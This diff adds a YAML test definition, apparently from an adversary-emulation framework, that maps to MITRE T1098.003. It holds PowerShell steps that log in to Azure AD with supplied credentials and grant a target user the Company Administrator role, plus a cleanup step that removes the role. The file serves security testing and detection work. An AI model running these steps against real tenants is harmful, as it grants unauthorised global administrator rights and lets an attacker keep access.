@@ -1,0 +1,45 @@
+api_version: "2.0"
+name: Azure AD - Add Company Administrator Role to a user
+description: |
+    Add an existing Azure user account the Company Administrator Role.
+args:
+    - name: username
+      type: string
+      default: jonh@contoso.com
+    - name: password
+      type: string
+      default: p4sswd
+    - name: target_user
+      type: string
+      default: default
+uuid: 4d77f913-56f5-4a14-b4b1-bf7bb24298ad
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1098: Account Manipulation'
+    subtechniques:
+        - 'T1098.003: Additional Cloud Roles'
+requirements:
+    platforms:
+        - os: azure-ad
+steps:
+    - name: |
+        MSOnline module must be installed.
+      inline: |
+        try {if (Get-InstalledModule -Name MSOnline -ErrorAction SilentlyContinue) {exit 0} else {{Install-Module -Name MSOnline -Force
+        }}} catch {exit 1}
+      executor: powershell
+    - name: azure-ad---add-company-administrator-role-to-a-user
+      inline: |
+        Import-Module MSOnline
+        $Password = ConvertTo-SecureString -String "{{.Args.password}}" -AsPlainText -Force
+        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "{{.Args.username}}", $Password
+        Connect-MsolService -Credential $Credential
+        Add-MsolRoleMember -RoleName "Company Administrator" -RoleMemberEmailAddress "{{.Args.target_user}}"
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-MsolRoleMember -RoleName "Company Administrator" -RoleMemberType User -RoleMemberEmailAddress "{{.Args.target_user}}"
+        executor: powershell
